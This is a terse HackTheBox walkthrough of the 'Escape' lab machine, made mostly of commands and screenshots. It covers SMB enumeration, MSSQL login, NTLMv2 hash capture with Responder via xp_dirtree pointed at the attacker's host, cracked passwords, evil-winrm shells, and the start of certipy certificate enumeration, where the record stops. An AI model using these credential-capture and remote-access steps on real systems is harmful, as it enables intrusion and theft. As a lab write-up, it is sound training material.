### 07-Apr-24-Sun

[Escape | HackTheBox](https://app.hackthebox.com/machines/Escape)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/58dc0b6a-e0d6-420d-bd8d-1f1aa7418287)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/993c7b71-fb42-434a-80d3-9ca4e0617927)

```
smbclient -L \\\\10.129.213.2\\
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9a33d547-f414-4fc8-9136-37181d62cc38)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/521c2b48-3a47-44e9-a6ab-36ac7bc6a2ae)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/612e27ac-93a7-467f-8b32-00aa76950817)

```
GuestUserCantWrite1
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c0a86cd2-3a7f-4267-aa9c-9f951e873e8f)

```
impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@sequel.htb -dc-ip 10.129.213.2
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/b8b41ede-3777-43bc-9259-3fa51b11b377)

```
sudo responder -I eth1 -dw
```

```
xp_dirtree \\ip\test
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/9a46fc26-fb07-420d-bcbe-81a412e37a44)

```
[SMB] NTLMv2-SSP Client   : 10.129.213.2
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:4e3dc6650c15496c:6D3E9806D51B07B0F8648EFA40CD6CB0:010100000000000080D33B2A4A89DA01C48BEE5E143AE8800000000002000800360046004B00430001001E00570049004E002D0036004D0047004100590045003400590051004D00590004003400570049004E002D0036004D0047004100590045003400590051004D0059002E00360046004B0043002E004C004F00430041004C0003001400360046004B0043002E004C004F00430041004C0005001400360046004B0043002E004C004F00430041004C000700080080D33B2A4A89DA0106000400020000000800300030000000000000000000000000300000BFA447244477D71468AC40F848804DD37384B1D97669B761C3A145E875BCB1E50A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00320032000000000000000000
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/ef46db45-1de1-4b12-ab78-16401ea81574)

```
REGGIE1234ronnie
```

```
impacket-mssqlclient sequel.htb/sql_svc:'REGGIE1234ronnie'@10.129.213.2 -windows-auth
```

```
evil-winrm -i 10.129.213.2 -u 'sql_svc' -p 'REGGIE1234ronnie'
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/c2353b04-aa5b-47ea-aeab-115bf63d8413)

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/4b772d10-afa0-43f9-8b81-31e4299d93af)

```
download ERRORLOG.BAK
```

```
NuclearMosquito3
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/2117ff32-c0bc-408c-a030-beb41336799b)

```
evil-winrm -i 10.129.213.2 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
```

```
e98a84f51d7b2b5fbdbb71ccac43adb0
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/de459ae2-63f9-4635-9bb2-3076ffeba4f7)

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop>
```

![image](https://github.com/r1skkam/HackTheBox-Walkthroughs/assets/58542375/a0077d86-712c-41ce-bf58-81b4e88e12df)

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop>
```

https://github.com/ly4k/Certipy

```
certipy find -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.129.213.2
```
